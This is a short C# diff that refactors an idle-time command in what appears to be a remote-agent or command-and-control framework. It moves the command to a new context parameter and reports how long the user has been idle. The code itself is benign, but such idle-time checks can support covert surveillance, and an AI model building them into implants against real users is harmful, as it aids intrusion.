@@ -34,10 +34,10 @@ namespace Agent.Commands
             var res = utcnow.Subtract(lastInputTime);
             return res;
         }
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
             var timespan = GetIdleTime();
-            result.Result = $"Idle for {timespan.Hours}:{timespan.Minutes}:{timespan.Seconds}";
+            context.Result.Result = $"Idle for {timespan.Hours}:{timespan.Minutes}:{timespan.Seconds}";
         }
     }
 }
